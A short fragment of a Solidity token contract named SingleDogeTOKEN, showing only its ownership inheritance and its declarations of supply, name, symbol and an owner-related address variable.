...
contract SingleDogeTOKEN is Ownable {
    address public cdbxs25;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "SingleDoge";
    string private _cctokensymbol = "SingleDoge";
